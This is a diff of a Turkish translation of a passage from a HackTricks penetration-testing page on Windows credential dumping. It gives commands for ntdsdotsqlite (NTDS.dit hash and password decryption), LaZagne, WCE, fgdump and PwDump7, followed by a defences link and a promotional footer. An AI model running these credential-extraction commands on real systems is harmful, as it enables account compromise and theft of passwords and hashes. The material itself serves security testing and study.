-NTDS nesneleri, [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkarılabilir. Sadece sırlar çıkarılmaz, aynı zamanda ham NTDS.dit dosyası zaten alındığında daha fazla bilgi çıkarma için tüm nesneler ve özellikleri de çıkarılır.
+NTDS nesneleri, [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkartılabilir. Sadece sırlar değil, aynı zamanda ham NTDS.dit dosyası zaten alındığında daha fazla bilgi çıkartma için tüm nesneler ve onların öznitelikleri de çıkartılır.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-`SYSTEM` hive isteğe bağlıdır ancak şifreleri (NT ve LM karmaşaları, açık metin şifreleri gibi ek bilgiler, kerberos veya güven anahtarları, NT ve LM şifre geçmişleri) çözümlemek için kullanılır. Diğer bilgilerle birlikte, aşağıdaki veriler çıkarılır: kullanıcı ve makine hesapları ile karmaşaları, UAC bayrakları, son oturum açma ve şifre değiştirme zaman damgaları, hesap açıklamaları, isimler, UPN, SPN, gruplar ve özyinelemeli üyelikler, örgütsel birimler ağacı ve üyelikleri, güvenilen etki alanları ve güven türü, yönlendirme ve öznitelikler...
+`SYSTEM` hive isteğe bağlıdır ancak sırların şifresini çözmeye olanak tanır (NT & LM hash'leri, düz metin parolalar, kerberos veya güven anahtarları, NT & LM parola geçmişleri gibi ek kimlik bilgileri). Diğer bilgilerle birlikte, aşağıdaki veriler çıkarılır: kullanıcı ve makine hesapları ve bunların hash'leri, UAC bayrakları, son oturum açma ve parola değişikliği için zaman damgası, hesap açıklamaları, adlar, UPN, SPN, gruplar ve özyinelemeli üyelikler, organizasyon birimleri ağacı ve üyelik, güvenilen alanlar ile güven türü, yönü ve öznitelikler...
 
 ## Lazagne
 
-İndirmek için [buradan](https://github.com/AlessandroZ/LaZagne/releases) ikili dosyayı indirebilirsiniz. Bu ikili dosyayı çeşitli yazılımlardan kimlik bilgilerini çıkarmak için kullanabilirsiniz.
+İkili dosyayı [buradan](https://github.com/AlessandroZ/LaZagne/releases) indirin. Bu ikili dosyayı çeşitli yazılımlardan kimlik bilgilerini çıkarmak için kullanabilirsiniz.
 ```
 lazagne.exe all
 ```
@@ -367,11 +274,11 @@ lazagne.exe all
 
 ### Windows credentials Editor (WCE)
 
-Bu araç, bellekten kimlik bilgilerini çıkarmak için kullanılabilir. İndirme bağlantısı: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+Bu araç, kimlik bilgilerini bellekten çıkarmak için kullanılabilir. Şuradan indirebilirsiniz: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
-SAM dosyasından kimlik bilgilerini çıkarın.
+SAM dosyasından kimlik bilgilerini çıkarın
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
@@ -386,22 +293,22 @@ type outpwdump
 ```
 ### PwDump7
 
-İndirin: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) ve sadece **çalıştırın** ve şifreler çıkarılacaktır.
+İndirin: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) ve sadece **çalıştırın**, şifreler çıkarılacaktır.
 
 ## Savunmalar
 
-[**Bazı kimlik bilgisi korumaları hakkında bilgi edinin buradan.**](credentials-protections.md)
+[**Bazı kimlik bilgisi korumalarını burada öğrenin.**](credentials-protections.md)
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hacklemeyi öğrenin<strong>!</strong></summary>
+<summary><strong>Sıfırdan kahramana AWS hacking öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 HackTricks'i desteklemenin diğer yolları:
 
-* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
+* **Şirketinizin HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** istiyorsanız [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.
+* Özel [**NFT**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
+* **💬 Discord grubuna** [**katılın**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) **bizi takip edin.**
+* **HackTricks'e PR göndererek hacking ipuçlarınızı paylaşın** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.
 
 </details>
